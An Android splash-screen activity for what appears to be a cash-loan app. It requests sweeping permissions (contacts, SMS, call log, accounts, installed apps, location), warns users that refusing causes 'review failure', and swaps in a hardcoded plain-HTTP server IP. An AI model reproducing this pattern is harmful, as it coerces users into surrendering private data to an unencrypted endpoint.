package com.chat.uikit;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.gson.Gson;
import com.idss.cashloans.api.Constants;
import com.idss.cashloans.api.moudle.OfficialUrl;
import com.idss.cashloans.api.utils.LogUtil;

import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.core.Observer;
import io.reactivex.rxjava3.disposables.Disposable;

public class SplashCashActivity extends AppCompatActivity {

    private static final String[] PERMISSIONS_STORAGE = {
            "android.permission.CAMERA",
            "android.permission.WRITE_SETTINGS",
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.QUERY_ALL_PACKAGES",
            "com.android.permission.GET_INSTALLED_APPS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.GET_INSTALLED_APPS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_PRIVILEGED_PHONE_STATE",
            "android.permission.MOUNT_UNMOUNT_FILESYSTEMS",
            "android.permission.GET_ACCOUNTS"};
    private static final int REQUEST_CODE = 1;


    @Override
    public void onCreate(@Nullable Bundle savedInstanceState, @Nullable PersistableBundle persistentState) {
        super.onCreate(savedInstanceState, persistentState);
        LogUtil.e("==============SplashCashActivity==========");
        getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
        View stateView = getWindow().getDecorView();
        int vis = stateView.getSystemUiVisibility();
        vis |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR; //黑色
//        vis &= ~View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR; //白色
        stateView.setSystemUiVisibility(vis);//设置状态栏字体颜色
        getWindow().setStatusBarColor(getColor(R.color.white));
        getOfficialUrl(SplashCashActivity.this);
        //申请权限
        ActivityCompat.requestPermissions(SplashCashActivity.this, PERMISSIONS_STORAGE, REQUEST_CODE);
    }



    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            //权限的申请结果返回
            case REQUEST_CODE:
                LogUtil.e("同意的权限数量：" + (grantResults.length));
                LogUtil.e("第一个权限是不是被同意：" + (PackageManager.PERMISSION_GRANTED));
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Observable.just("Hello").delay(0, TimeUnit.SECONDS).subscribe(new Observer<String>() {
                        @Override
                        public void onSubscribe(Disposable d) {
                            System.out.println("onSubscribe");
                        }

                        @Override
                        public void onNext(String s) {
                            System.out.println("onNext");
                        }

                        @Override
                        public void onError(Throwable e) {
                            System.out.println("onError: " + e.getMessage());
                        }

                        @Override
                        public void onComplete() {
                            getOfficialUrl(SplashCashActivity.this);
                        }
                    });
                } else {
                    //未授权
                    Toast.makeText(this, "申请权限被拒绝,这将导致审核失败.", Toast.LENGTH_SHORT).show();
                }

                break;
        }
    }

    public void getOfficialUrl(Context context) {

        RequestQueue mQueue = Volley.newRequestQueue(context);
        StringRequest stringRequest = new StringRequest(Constants.OFFICAL_URL,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Gson gson = new Gson();
                        OfficialUrl officialUrl = gson.fromJson(response, OfficialUrl.class);

                        Constants.BASE_URL = officialUrl.getUrl();
                        LogUtil.e("Constants.BASE_URL:" + Constants.BASE_URL);
                        Constants.BASE_URL = "http://46.149.202.219:8083/";
                        startActivity(new Intent(SplashCashActivity.this, TabActivity.class));
                        finish();
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.e("=======", error.getMessage(), error);
            }
        });
        mQueue.add(stringRequest);

    }
}